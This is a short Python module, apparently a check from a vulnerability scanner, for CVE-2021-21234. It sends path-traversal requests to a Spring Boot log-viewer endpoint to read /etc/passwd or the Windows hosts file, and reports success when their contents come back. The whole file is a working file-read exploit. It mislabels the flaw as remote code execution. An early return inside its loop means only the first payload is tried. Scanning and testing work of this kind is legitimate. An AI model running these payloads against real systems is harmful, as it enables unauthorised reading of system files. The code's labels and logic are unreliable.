#!/usr/local/bin/python3
# -*- coding: utf-8 -*-
"""
   File Name：     cve_2021_21234.py
   Description :
   Author :       sule01u
   date：          2023/10/19
"""
import requests
from utils.custom_headers import DEFAULT_HEADER, TIMEOUT
from utils.logging_config import configure_logger
logger = configure_logger(__name__)
requests.packages.urllib3.disable_warnings()


def check(url, proxies=None):
    """  
    对给定的目标URL检测CVE-2021-21234漏洞。

    参数:
    - target_url: 待检测的目标URL
    - proxies: 代理配置
    """
    CVE_ID = "CVE-2021-21234"

    payloads = [
        "manage/log/view?filename=/etc/passwd&base=../../../../../../../",
        "manage/log/view?filename=C:/Windows/System32/drivers/etc/hosts&base=../../../../../../../",
        "manage/log/view?filename=C:\\Windows\\System32\\drivers\\etc\\hosts&base=../../../../../../../"
    ]
    for payload in payloads:
        target_url = url + payload
        try:
            res = requests.get(target_url, headers=DEFAULT_HEADER, timeout=TIMEOUT, verify=False, proxies=proxies)
            if res.status_code == 200:
                if (r"root" in res.text and r"nobody" in res.text and r"daemon" in res.text) or ("Microsoft Corp" in res.text and "Microsoft TCP/IP for Windows" in res.text):
                    return True, {
                        "CVE_ID": CVE_ID,
                        "URL": target_url,
                        "Details": f"检测到{CVE_ID}的RCE漏洞",
                        "response": res.text[:20] + "...."
                    }
            return False, {
                "CVE_ID": CVE_ID,
                "URL": url,
                "Details": f"未检测到{CVE_ID}的RCE漏洞"
            }
        except requests.ConnectionError as e:
            logger.error(f"URL: {target_url} 连接错误：{e}")
            return False, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": f"连接错误：{e}"
            }
        except requests.Timeout as e:
            logger.error(f"URL: {target_url} 请求超时：{e}")
            return False, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": f"请求超时：{e}"
            }
        except requests.RequestException as e:
            logger.error(f"URL: {target_url} 请求出错：{e}")
            return False, {
                "CVE_ID": CVE_ID,
                "URL": target_url,
                "Details": f"请求出错：{e}"
            }


if __name__ == '__main__':
    is_vul, res = check("http://localhost:8080/", proxies={})
    print(is_vul, res)
